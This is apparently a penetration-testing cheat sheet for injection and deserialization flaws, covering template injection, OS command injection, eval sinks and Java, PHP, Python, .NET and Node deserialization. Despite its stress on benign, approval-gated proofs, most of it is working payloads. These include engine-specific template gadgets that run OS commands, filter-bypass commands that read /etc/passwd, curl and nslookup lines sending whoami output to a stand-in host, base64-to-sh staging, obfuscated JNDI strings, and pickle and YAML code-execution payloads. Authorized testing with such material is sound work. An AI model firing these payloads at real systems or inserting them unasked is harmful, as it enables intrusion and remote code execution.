# Injection detection + benign-proof payloads (shared by ssti / command-injection / deserialization)
# Confirm with BENIGN proofs (arithmetic, sleep, OOB). NO destructive RCE. Approval-gated for exec.

## SSTI — engine detection via math, then identify
```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  ${{7*7}}  @(7*7)  #{7*7}
```
49 (or a template error) = template-evaluated. Then fingerprint:
```
{{7*'7'}}        -> 7777777 = Jinja2/Twig (python/php) ; 49 only = Java (freemarker/velocity)
${7*7}           -> Freemarker/Velocity/Spring EL
#{7*7}           -> Ruby ERB-ish / JSF EL
```
Benign engine-specific proof (NOT RCE): e.g. Jinja2 `{{ config }}`; confirm sandbox vs escape before any exec.

## Command injection — benign confirmation
```
;id            |id            `id`           $(id)          %0aid
; sleep 5      && ping -c1 OOB    | curl http://OOB/
# blind: OOB (DNS/HTTP to collaborator) or timing (sleep). PREFER OOB/sleep over `id` output.
```

## Deserialization — markers + OOB
```
Java:   rO0AB...        (base64 of \xac\xed\x00\x05 serialized header)  — ysoserial gadgets (URLDNS for benign OOB)
PHP:    O:4:"User":...   (serialized object) ; __wakeup/__destruct gadgets
Python: pickle opcodes (c__builtin__\neval...) — DANGEROUS, use a BENIGN OOB gadget only
.NET:   TypeConfuseDelegate / ViewState (__VIEWSTATE) ; ysoserial.net
Node:   __proto__ / serialized function (node-serialize) — OOB marker
```
Confirm deserialization benignly: a **URLDNS-style** gadget that only triggers a DNS/HTTP callback
(no code exec) proves the sink deserializes attacker data. Escalate to a real gadget ONLY with approval.

## OOB
Embed a unique `TOKEN.oob.example` so blind exec/deserialization is attributable. Confirm execution by
the callback (JS/command output or DNS), never by running destructive commands.

---
## SSTI — engine-specific RCE (extended)

### SSTI → RCE by engine (benign proof FIRST: `id` / OOB, not a shell)
```
# Jinja2 (Python) — globals walk to os:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
#   filter-restricted env: build the command without quotes/spaces via request(), or stage a benign
#   base64 payload:  echo <base64>|base64 -d|bash   (reference pattern — use an OOB/`id` proof here)
# Twig (PHP):   {{['id']|filter('system')}}        {{['id']|map('system')|join}}
# Smarty (PHP): {system('id')}      {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}
# Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity:     #set($e=$x.class.forName('java.lang.Runtime')...) (engine-specific gadget)
# Pug/Jade (Node): #{global.process.mainModule.require('child_process').execSync('id')}
# ERB (Ruby):   <%= `id` %>        <%= system('id') %>
```
Tool: `SSTImap -u '<url>' ...` (confirm manually; keep proofs benign). Chain confirmed RCE to the
`command-injection` verifier criteria (OOB/timing, no destructive command).

---
## Extended arsenal — SSTI fingerprint decision matrix

Fire one polyglot, read which delimiter evaluated, then confirm the engine. An error that quotes a
template-engine class name is itself a fingerprint (e.g. `freemarker.`, `jinja2.`, `twig.`, `OgnlException`).
```
# One-shot polyglot (all delimiters at once — a 49 / 7777777 / error narrows the engine):
${7*7}${{7*7}}{{7*7}}<%=7*7%>#{7*7}@(7*7){7*7}[[${7*7}]]#set($x=7*7)$x
```
| probe | result | candidate engine(s) | language |
|---|---|---|---|
| `{{7*7}}` | 49 | Jinja2, Twig, Nunjucks, Pebble, Tornado | Py / PHP / Node / Java |
| `{{7*'7'}}` | 7777777 | Jinja2, Tornado | Python |
| `{{7*'7'}}` | 49 | Twig | PHP |
| `${7*7}` | 49 | Freemarker, Spring-EL, Thymeleaf, Mako, JSP-EL | Java / Python |
| `#{7*7}` | 49 | Slim, JSF-EL, Pug (interp) | Ruby / Java / Node |
| `<%= 7*7 %>` | 49 | ERB, EJS | Ruby / Node |
| `{7*7}` | 49 | Smarty | PHP |
| `@(7*7)` | 49 | Razor | .NET |
| `[[${7*7}]]` | 49 | Thymeleaf | Java |
| `#set($x=7*7)$x` | 49 | Velocity | Java |
| `{{.}}` dumps context, math inert | — | Go text/template, Mustache, Handlebars | Go / Node |

---
## Extended arsenal — SSTI benign eval proof + context read, by engine

Primary proof is pure arithmetic/string (truly benign, can't be confused with reflection). The context
object is read-only info-disclosure — useful but may leak secrets, so REDACT. RCE gadgets are separate below.
| engine (lang) | benign eval proof | benign context read (info-disclosure — redact) |
|---|---|---|
| Jinja2 (Py) | `{{7*7}}` / `{{7*'7'}}` | `{{ self }}` `{{ request }}` `{{ config }}` |
| Mako (Py) | `${7*7}` | `${ self.module }` `${ dir() }` |
| Tornado (Py) | `{{7*7}}` | `{{ handler }}` `{{ locale }}` |
| Twig (PHP) | `{{7*7}}` | `{{ _self }}` `{{ _context }}` `{{ dump() }}` |
| Smarty (PHP) | `{7*7}` | `{$smarty.version}` `{$smarty.server}` |
| Freemarker (Java) | `${7*7}` | `${.data_model}` `${.globals}` |
| Velocity (Java) | `#set($x=7*7)$x` | `$class` `$application` |
| Spring-EL (Java) | `${7*7}` / `#{7*7}` | `#{systemProperties}` `#{T(java.lang.System)}` |
| Thymeleaf (Java) | `[[${7*7}]]` | `[[${#request}]]` `[[${#ctx}]]` |
| Pebble (Java) | `{{7*7}}` | `{{ request }}` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= self %>` `<%= ENV %>` |
| Slim (Ruby) | `#{7*7}` | `#{ENV}` |
| Liquid (Ruby) | `times` filter math (sandboxed) | `{{ settings }}` — usually info-leak only |
| EJS (Node) | `<%= 7*7 %>` | `<%= Object.keys(this) %>` |
| Nunjucks (Node) | `{{7*7}}` | `{{ self }}` |
| Handlebars (Node) | `{{this}}` (no math) | `{{this}}` |
| Pug/Jade (Node) | `#{7*7}` | `#{Object.keys(global)}` |
| Razor (.NET) | `@(7*7)` | `@Context` `@Html` |
| Go text/template | `{{.}}` (math inert) | `{{ . }}` `{{ printf "%+v" . }}` |

Engine-specific RCE gadgets for engines NOT already covered up top (approval-gated; prove 7*7 / `id` / OOB FIRST):
```
# --- Python ---
# Mako:
<%import os%>${os.popen('id').read()}            ${__import__('os').popen('id').read()}
# Tornado:
{% import os %}{{ os.popen('id').read() }}
# --- Java / Spring ---
# Thymeleaf (inline + preprocessing fragment forms):
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
# Spring-EL (SpEL):
T(java.lang.Runtime).getRuntime().exec('id')     new java.lang.ProcessBuilder({'id'}).start()
# Velocity (classic reflection gadget):
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
# Pebble (method-reflection off a literal, newer versions):
{% set rt=(1).getClass().forName('java.lang.Runtime') %}... getRuntime().exec('id')
# --- Ruby ---
# Slim / Erubi:   #{ `id` }      #{ system('id') }
# Liquid:         sandboxed by default -> usually info-leak only; audit registered filters/tags
# --- Node ---
# EJS:        <%- global.process.mainModule.require('child_process').execSync('id') %>
# Nunjucks:   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
# Handlebars: prototype/helper gadget resolving require('child_process').execSync('id')  (version-specific)
# --- .NET ---
# Razor:      @{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
# --- Go ---
# text/template: no arithmetic. Impact = calling a dangerous METHOD exposed on the data object, else info-leak:
{{ .SomeExposedMethod "id" }}        {{ . }}        # html/template auto-escapes OUTPUT (not a sink guard)
```

---
## Extended arsenal — SSTI sandbox + filter bypass (keep to 7*7 / id / OOB)

Jinja2-centric but the ideas (attribute walk, quote-free, space-free, name-from-request) generalize.
```
# Attribute access when '.' or '[]' is filtered:
{{ ''|attr('__class__') }}                               # |attr instead of .__class__
{{ self.__init__.__globals__ }}                           # reach module globals
{{ ''.__class__.__mro__[1].__subclasses__() }}            # walk subclasses to locate os/subprocess (benign enum)
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
# No quotes (pull strings from the request, build chars):
{{ request.args.c }}                                      # command comes from a request arg -> no quotes in template
{{ ()|attr(request.args.a) }}                             # attribute NAME from a request arg
{{ dict(a=1)|join }}                                      # emit chars/strings without quote literals
# No spaces: concatenate with ~, use %0a / + , or push args through request params
{{''|attr(request.args.x)}}
# Blacklist on _ / class / mro: use |attr, hex \x5f for '_', unicode escapes, or request-sourced names
# Whatever the bypass, the BENIGN proof stays the same: resolve to `id` output or an OOB nslookup/curl to TOKEN.oob.example
```

---
## Extended arsenal — OS command injection: separators, substitution, context (sh/bash)

Benign confirmation only — `id`/`whoami`, `sleep` timing, or an OOB DNS/HTTP canary. No shells, no C2.
```
# Inline separators (append to a command the app already runs):
;   &   &&   ||   |   %0a(newline)   %0d   $'\n'
# Command substitution (when input lands INSIDE a command string):
$(id)    `id`    <(id)    >(id)
# Context breakouts (match the quoting around the injection point):
value; id                         # statement terminator
value | id                        # pipe stdout into id
value || id                       # runs only if the first command fails
value && id                       # runs only if the first command succeeds
"value"; id ; echo "              # break out of a double-quoted argument
'value'; id ; echo '              # break out of a single-quoted argument
val%0aid                          # newline injection — extremely common in web params
```
Benign confirmation (choose by egress + noise):
```
; id                              # identity (benign, direct output)
; sleep 5                         # time-based — compare against a 0s baseline
; curl http://TOKEN.oob.example/$(whoami)      # OOB HTTP, marker = whoami (benign)
; nslookup $(whoami).TOKEN.oob.example         # OOB DNS — survives HTTP egress filtering
` ping -c1 TOKEN.oob.example `                  # resolution-triggered DNS lookup
```
| technique | payload | proof |
|---|---|---|
| sleep | `; sleep 5` | response delayed ~5s vs baseline |
| conditional | `; [ $(id -u) = 0 ] && sleep 5` | boolean fact encoded as a delay |
| OOB DNS | `; nslookup x.TOKEN.oob.example` | DNS hit logged at the collaborator |
| OOB HTTP | `; curl http://TOKEN.oob.example/x` | HTTP hit (method/UA/exfil marker) |

---
## Extended arsenal — command injection: argument & filter bypass (bash)
```
# Spaces filtered -> IFS / brace expansion / redirection / tab:
cat</etc/passwd                        # input redirection instead of a space
{cat,/etc/passwd}                      # brace expansion splits args
cat$IFS/etc/passwd                     # $IFS is a space/tab by default
cat$IFS$9/etc/passwd                   # $9 expands to empty, leaving a clean separator
# Slashes filtered -> build "/" from an env var:
echo ${PATH:0:1}                       # first char of PATH == "/"
# Keyword blacklist (id/cat/...) -> quote/escape/concat/glob insertion keeps the exec'd token intact:
w'h'oami    wh\oami    who$@ami    who''ami    $'\x69\x64'      # the last builds "id" from hex
/???/??t  /???/p??s??                  # globbing resolves to /bin/cat  /etc/passwd
a=i;b=d;$a$b                           # assemble "id" from pieces (no literal "id")
# No-exec staging (benign ONLY): the decoded command MUST stay benign (id/whoami), NEVER a shell/reverse shell:
echo aWQK|base64 -d|sh                 # aWQK -> "id"  (reference pattern; keep the payload benign)
# HTTP-layer encoding: url-encode ; & | %0a; double-encode if a WAF strips one layer
```

---
## Extended arsenal — Windows command injection (cmd.exe + PowerShell)
```
# cmd.exe separators:
value & whoami            value && whoami            value | whoami            value || whoami
# cmd substitution-ish (capture output via FOR):
value & for /f %i in ('whoami') do @echo %i
# env-var tricks (obfuscation / char building):
%COMSPEC%                             # resolves to the cmd path
%HOMEPATH:~0,1%                       # slice an env var to build individual chars
# PowerShell:
value; whoami                         value | whoami                         $(whoami)        # subexpression
# PowerShell benign timing / OOB:
; Start-Sleep 5                       # time-based
; Resolve-DnsName x.TOKEN.oob.example # OOB DNS
; nslookup x.TOKEN.oob.example
# Encoded form (obfuscation): powershell -enc <base64-UTF16LE>  -- decoded command MUST stay benign (whoami/sleep)
# Blind timing on Windows: & timeout /t 5   (cmd)   ;Start-Sleep 5 (PS)
```

---
## Extended arsenal — code-injection / eval sinks by language

Each language: the sinks, a benign eval proof, and a DNS/HTTP OOB that proves execution WITHOUT a shell.
```
# ===== PHP =====
# Sinks: eval()  assert()  preg_replace('/x/e',...)  create_function()  call_user_func()
#        system/exec/shell_exec/passthru/popen/proc_open/backticks  include/require(+ data://)
# Benign eval proof:  print(7*7);  -> 49     |  var_dump(7*7)     |  md5(42)
# assert (string arg is eval'd in older PHP):   x' and print(7*7) and '1
# preg_replace /e (deprecated but still seen):  pattern /.*/e  replacement  print(7*7)
# OOB (no shell):  file_get_contents('http://TOKEN.oob.example/'.urlencode(php_uname()));
# include bridge:  ?page=data://text/plain;base64,<b64 of  <?=7*7;?> >      (LFI -> eval)

# ===== Python =====
# Sinks: eval() exec() compile() __import__  str.format/f-string on attacker format  input()(py2)
#        subprocess.*  os.system  pickle.loads  yaml.load(Loader=)/unsafe_load  template render
# Benign proof:  7*7   |   __import__('socket').gethostbyname('TOKEN.oob.example')   # OOB DNS, no shell
# format-string sink (no eval needed):  {0.__class__}  /  {ENV[SECRET]}   -> info-disclosure
# yaml:  !!python/object/apply:socket.gethostbyname ['TOKEN.oob.example']   # DNS-only benign
#        !!python/object/apply:os.system ['id']                             # APPROVAL-GATED

# ===== Node.js =====
# Sinks: eval()  Function()  vm / vm2 (sandbox escape)  child_process.exec/execSync/spawn  require()  setTimeout("str")
# Benign proof:  7*7   |   require('dns').lookup('TOKEN.oob.example',()=>{})     # OOB DNS, no shell
# Function ctor:  Function('return 7*7')()
# vm2 escapes are version-specific (APPROVAL-GATED) -> prove the breach with an OOB DNS only

# ===== Ruby =====
# Sinks: eval/instance_eval/class_eval  send/public_send  system/%x[]/`...`  open('|cmd')  ERB.new(x).result
# Benign proof:  7*7   |   require('resolv'); Resolv.getaddress('TOKEN.oob.example')   # OOB DNS
# open('|id')  and  `id`  are RCE -> APPROVAL-GATED

# ===== Java expression languages =====
# EL (JSP/JSF ${...}):   ${7*7}   ${pageContext}   ${''.getClass().forName('java.lang.Runtime')...}   (appr.-gated)
# OGNL (Struts2 %{...}): %{7*7}   then (memberAccess sandbox bypass) @java.lang.Runtime@getRuntime().exec('id') (appr.-gated)
# SpEL (#{...}/${...}):  T(java.lang.Math).random()   |   T(java.lang.Runtime).getRuntime().exec('id')  (appr.-gated)
# MVEL / JEXL / Groovy(GString):  7*7   ;   "id".execute()  (Groovy, APPROVAL-GATED)
```

---
## Extended arsenal — Java deserialization (benign URLDNS / DNS-only proof FIRST)
```
# Detection markers (any encoding of the stream header bytes AC ED 00 05):
rO0AB...            # base64 of the serialized header
aced0005...         # hex
H4sIA...            # gzip-then-base64 (compressed stream)
Content-Type: application/x-java-serialized-object
# Common carriers: cookies, hidden fields, JSF __VIEWSTATE (javax.faces.ViewState), RMI/JMX, JMS, AMF,
#                  WebLogic T3, Spring HTTP invoker, and Jackson/XStream/Kryo endpoints.
```
Benign confirmation (preferred — no code execution):
```
# URLDNS: a HashMap gadget whose deserialization resolves a URL host via DNS. Pure lookup, zero code exec:
ysoserial URLDNS "http://TOKEN.oob.example/" | base64 -w0          # paste into the sink; DNS hit == vulnerable
# JRMPClient: opens a TCP connection to an attacker host (OOB TCP proof, still no local exec):
ysoserial JRMPClient "HOST:1099" | base64 -w0
```
RCE gadget families (APPROVAL-GATED; run URLDNS first, then stop unless approved). Availability depends on
classpath libraries — pick by the detected dependencies; names below are gadget techniques, not sources:
```
CommonsCollections1-7   CommonsBeanutils1   Spring1/2   Groovy1   Hibernate1/2   ROME   C3P0   Clojure   Jdk7u21
FileUpload1             # file-write only (less dangerous than exec) — still approval-gated
```
JNDI / LDAP injection (Log4Shell-class string sink):
```
${jndi:ldap://TOKEN.oob.example/x}       # proof = LDAP/DNS callback (benign)
${jndi:dns://TOKEN.oob.example/x}        # DNS-only variant
# Remote class-loading -> RCE is APPROVAL-GATED; the callback alone proves reachability.
# Obfuscations seen in the wild: ${${lower:j}ndi:...}   ${${::-j}${::-n}di:...}
# Tools: ysoserial, marshalsec (JNDI/LDAP referral server), gadgetinspector.
```

---
## Extended arsenal — PHP object injection / deserialization
```
# Detection markers:  O:4:"User":2:{...}   a:2:{...}   s:/i:/b: typed fields   base64 of the same in cookies/params
#   error noise: __PHP_Incomplete_Class, "unserialize()" warnings on malformed input.
# Magic methods that fire a POP chain: __wakeup  __destruct  __toString  __call  __get  __set  __invoke
# Benign proof that needs NO code exec: a gadget whose magic method performs an OOB HTTP/SSRF to the canary
#   (SoapClient / Guzzle / Monolog families) -> proves the blob was deserialized without running a shell:
O:10:"SoapClient":3:{...s:8:"location";s:30:"http://TOKEN.oob.example/x";...}    # SSRF-on-deserialize benign proof
# phar:// deserialization (object metadata is auto-unserialized by file ops on a phar):
#   sinks: file_exists / fopen / getimagesize / file_get_contents / is_file(..., 'phar://x.phar/f')
#   upload a benign .phar whose metadata object triggers the OOB/SSRF gadget above.
# Tool: phpggc -l (list chains); phpggc <chain> system id  (RCE chain = APPROVAL-GATED; OOB/SSRF first).
```

---
## Extended arsenal — Python pickle / PyYAML (DANGEROUS — benign OOB only)

`__reduce__` returns `(callable, args)` and is CALLED on load, before any app logic. The benign canary is a
DNS/HTTP lookup, never `os.system`, never a shell, no file/env access.
```
# Markers:  base64 starting gASV / gAR / gAN (proto 2-5)   \x80\x04 header   c__builtin__\neval   cos\nsystem
#           Content-Type application/python-pickle ; .pkl/.joblib model files (torch.load unpickles too)
class P:
    def __reduce__(self):
        import socket
        return (socket.gethostbyname, ("TOKEN.oob.example",))   # OOB DNS proves execution — no shell / no C2
# pickle.dumps(P()) -> feed the sink; a DNS hit at the collaborator == arbitrary-code sink confirmed (benign).
# PyYAML (yaml.load without SafeLoader / unsafe_load):
!!python/object/apply:socket.gethostbyname ['TOKEN.oob.example']    # benign DNS proof
!!python/object/apply:os.system ['id']                             # APPROVAL-GATED
# jsonpickle / dill / numpy allow_pickle=True share the reduce semantics -> same benign DNS proof.
# Audit without loading: fickling / picklescan flag the REDUCE / GLOBAL opcodes (evidence without execution).
```

---
## Extended arsenal — .NET deserialization
```
# Markers:  AAEAAAD/////  (BinaryFormatter base64)   __VIEWSTATE=...   "$type": in JSON (Json.NET)
#           TypeNameHandling   SimpleTypeResolver   System.RuntimeType
# Dangerous formatters / configs:
#   BinaryFormatter, LosFormatter / ObjectStateFormatter (ViewState), SoapFormatter, NetDataContractSerializer,
#   Json.NET TypeNameHandling=Auto/All/Objects, JavaScriptSerializer + SimpleTypeResolver, typed XmlSerializer,
#   DataContractSerializer (known-types), FastJSON, fsPickler.
# ViewState: if __VIEWSTATE lacks a MAC (enableViewStateMac=false) or the machineKey is known -> deserialization.
#   Decode first (viewgen / ysoserial.net --generator) ; a real gadget is APPROVAL-GATED.
# Gadgets (ysoserial.net): TypeConfuseDelegate, ActivitySurrogateSelector, ObjectDataProvider, WindowsIdentity,
#   DataSet, RolePrincipal -- all RCE -> APPROVAL-GATED.
# Benign-first proof: a parse differential / forced type-load error showing the resolver honored an
#   attacker-supplied $type, or an OOB via a URI-typed property -- no gadget executed.
```

---
## Extended arsenal — Node.js / Ruby / other deserialization
```
# ===== Node =====
# node-serialize: a function property containing an IIFE runs on unserialize():
```
```json
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup('TOKEN.oob.example',()=>{})}()"}
```
```
#   benign OOB DNS above; the child_process form is APPROVAL-GATED. Markers: _$$ND_FUNC$$_ , $$ND_FUNC$$
# funcster / serialize-to-js / cryo -- similar function-revival sinks; same benign DNS proof.

# ===== Ruby =====
# Marshal.load  (marker \x04\x08 ; base64 BAg...)   |   YAML.load/Psych  !ruby/object:...   |   Oj.load
# Universal gadget chains exist (technique names only); prove benignly, escalate only with approval.

# ===== Generic deserializer rule =====
# For ANY deserializer: prefer a gadget whose ONLY effect is a DNS/HTTP hit to TOKEN.oob.example.
# A callback proves the attacker-controlled blob was deserialized WITHOUT executing code locally.
```

---
## Extended arsenal — benign-proof & OOB canary cheatsheet (all three classes)

| class | sink seen | first benign proof (no RCE) | escalation (approval-gated) |
|---|---|---|---|
| SSTI | `{{7*7}}` -> 49 | arithmetic / string eval | engine RCE gadget -> `id` / OOB |
| cmd-injection | metachar reflected | `sleep` timing / OOB DNS | `id` / `whoami`, no shell |
| code eval | eval/exec parameter | `7*7` / OOB DNS lookup | language RCE -> `id` / OOB |
| Java deser | `rO0AB` / ViewState | URLDNS DNS callback | gadget chain (classpath-dependent) |
| PHP deser | `O:` / phar | SoapClient SSRF -> OOB | phpggc chain |
| Python pickle | `gASV` / `.pkl` | `__reduce__` -> socket DNS | `os.system` reduce |
| .NET deser | `AAEAAAD` / `$type` | type-resolver differential | ysoserial.net gadget |
| Node deser | `_$$ND_FUNC$$_` | DNS-lookup IIFE | child_process IIFE |

OOB canary construction (attributable per injection point so blind hits map back to a sink):
```
TOKEN=$(openssl rand -hex 4)                       # e.g. 1a2b3c4d -- unique per sink
#  DNS:   ${TOKEN}.oob.example              (survives HTTP egress filtering; read at the authoritative DNS log)
#  HTTP:  http://TOKEN.oob.example/${TOKEN} (richer: captures method / UA / exfil-as-proof)
# Collaborator-style servers (interactsh and the like) capture DNS+HTTP+SMTP; confirm by the TOKEN, not a guess.
# Timing baseline: measure N clean requests, then inject sleep 5 / Start-Sleep 5 ; a clean >4s delta is the proof.
```
```
# Tools (confirm MANUALLY, keep proofs benign): SSTImap, tplmap (SSTI); commix (cmd-injection);
#   ysoserial + marshalsec (Java); ysoserial.net + viewgen (.NET); phpggc (PHP); fickling + picklescan (pickle audit).
```
